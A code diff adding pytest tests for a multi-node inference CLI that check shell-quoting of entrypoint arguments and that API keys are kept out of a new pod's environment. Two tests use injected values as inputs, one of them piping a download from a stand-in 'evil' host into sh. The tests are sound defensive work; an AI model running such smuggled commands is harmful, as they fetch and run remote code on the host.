@@ -1140,3 +1140,110 @@ def test_export_ray_address_to_os(monkeypatch: pytest.MonkeyPatch, tmp_path: Pat
     monkeypatch.delenv("RAY_ADDRESS", raising=False)
     mne.export_ray_address_to_os()
     assert os.environ.get("RAY_ADDRESS") == "10.0.0.5:6379"
+
+
+# ---------------------------------------------------------------------------
+# Multi-node control-plane hardening (shell-quoting + credential minimization).
+
+
+def test_multinode_entrypoint_shlex_quotes_malicious_value():
+    """A shell-metacharacter kernel_id must be shlex-quoted into the Ray
+    Dashboard entrypoint, not spliced in as bare shell (no command injection)."""
+    import shlex
+
+    from inference_optimizer.multi_node import cli as mn_cli
+
+    evil = "k'; touch /tmp/pwned #"
+    ep = mn_cli._build_multinode_apply_patch_entrypoint("/t/x", "QUJD", "/bak", evil, 60)
+    # The value is carried, but only as a single shlex-quoted token.
+    assert shlex.quote(evil) in ep
+    # The raw ``--kernel-id k'; touch ...`` (unquoted) form must NOT appear.
+    assert f"--kernel-id {evil}" not in ep
+
+
+def test_multinode_op_args_shlex_quotes_malicious_value():
+    """The Dynamo SSH op_args builder path (bench) must also shlex-quote."""
+    import shlex
+
+    from inference_optimizer.multi_node import cli as mn_cli
+
+    evil = "x; curl http://evil/p | sh"
+    ns = argparse.Namespace(
+        workspace="/w",
+        bench_command=evil,
+        files_b64_json="{}",
+        result_glob="*.json",
+        timeout_sec=60,
+    )
+    ep = mn_cli._build_multinode_kernel_bench_entrypoint(
+        ns.workspace, ns.bench_command, ns.files_b64_json, ns.result_glob, ns.timeout_sec
+    )
+    assert shlex.quote(evil) in ep
+    assert f"--bench-command {evil}" not in ep
+
+
+def test_create_dynamo_env_omits_credentials(monkeypatch):
+    """create-dynamo must NOT bake *_API_KEY / SAFE_API_KEY / *_BASE_URL into the
+    new inference pod's container env; only operator --extra-env is forwarded."""
+    from inference_optimizer.multi_node import cli as mn_cli
+
+    # Credentials present in the controller env (would previously fan out).
+    for k in ("SAFE_API_KEY", "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "OOB_API_KEY", "LLM_API_KEY"):
+        monkeypatch.setenv(k, f"secret-{k}")
+    monkeypatch.setenv("OPENAI_BASE_URL", "https://example/v1")
+
+    monkeypatch.setattr(
+        mn_cli.ssh_client, "generate_session_keypair", lambda d: (Path("/tmp/k"), "pubkey")
+    )
+
+    captured: dict = {}
+
+    class _Sentinel(Exception):
+        pass
+
+    def _capture(**kwargs):
+        captured["extra_env"] = kwargs.get("extra_env")
+        raise _Sentinel()
+
+    monkeypatch.setattr(mn_cli.workload_spec, "build_dynamo_workload_body", _capture)
+
+    args = argparse.Namespace(
+        workspace="ws",
+        extra_env=["FOO=bar"],
+        extra_label=[],
+        image="img",
+        nodes=2,
+        gpus_per_node=8,
+        cpus_per_node=96,
+        mem_per_node=1024,
+        ephemeral_per_node=400,
+        shared_mem_per_node=200,
+        backend_framework="sglang",
+        kv_transfer_backend="nixl",
+        ssh_port=2222,
+        pd_mode="aggregated",
+        pd_prefill_nodes=0,
+        pd_decode_nodes=0,
+        pd_prefill_tp=0,
+        pd_decode_tp=0,
+        description=None,
+        owner_id=None,
+        display_name=None,
+        recreate=False,
+        no_wait=True,
+    )
+
+    with pytest.raises(_Sentinel):
+        mn_cli.cmd_create_dynamo(args)
+
+    env = captured["extra_env"]
+    assert env == {"FOO": "bar"}
+    for k in (
+        "SAFE_API_KEY",
+        "OPENAI_API_KEY",
+        "ANTHROPIC_API_KEY",
+        "OOB_API_KEY",
+        "LLM_API_KEY",
+        "OPENAI_BASE_URL",
+    ):
+        assert k not in env
